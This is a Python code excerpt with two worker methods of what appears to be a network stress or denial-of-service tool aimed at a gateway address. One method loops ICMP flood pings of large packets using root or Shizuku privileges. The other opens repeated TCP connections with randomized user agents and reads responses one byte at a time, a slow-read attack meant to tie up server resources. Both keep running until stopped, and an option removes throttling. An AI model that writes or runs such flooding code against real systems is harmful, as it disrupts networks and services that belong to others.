    def _icmp_worker(self, idx):
        if not (self.has_root or self.has_shizuku):
            self._log(self.L("l_icmp_denied"), "ERR")
            return
        if not is_valid_ip(self.gateway): return
        safe_gw = shlex.quote(self.gateway.strip())
        exec_cmd = self.shizuku if self.has_shizuku else self.root
        use_flood = self.has_root
        
        while not self.stop_flag:
            try:
                if use_flood: cmd = f"ping -c 10 -f -s 1400 {safe_gw}"
                else: cmd = f"ping -c 10 -s 1400 {safe_gw}"
                exec_cmd(cmd)
                with self.stats_lock: self.stats["icmp"] += 10
                if not self.throttle_ignore: time.sleep(0.1)
                else: time.sleep(0.05)
            except Exception as e:
                if idx == 0 and random.random() < 0.05: self._record_error("ICMP", e)
                break

    def _slowread_worker(self, idx):
        if not is_valid_ip(self.gateway): return
        target = (self.gateway, self.port)
        while not self.stop_flag:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                sock.connect(target)
                with self.sockets_lock: self.sockets.append(sock)
                req = (f"GET / HTTP/1.1\r\nHost: {self.gateway}\r\nUser-Agent: {generate_random_user_agent()}\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n").encode()
                sock.sendall(req)
                sock.settimeout(5.0)
                for _ in range(20):
                    if self.stop_flag: break
                    try:
                        data = sock.recv(1)
                        if not data: break
                    except socket.timeout: break
                    with self.stats_lock: self.stats["slowread"] += 1
                    time.sleep(0.5)
            except Exception as e:
                if idx == 0 and random.random() < 0.05: self._record_error("SlowRead", e)
                time.sleep(0.5)
            finally:
                with self.sockets_lock:
                    if sock in self.sockets: self.sockets.remove(sock)
                self._safe_close_socket(sock)

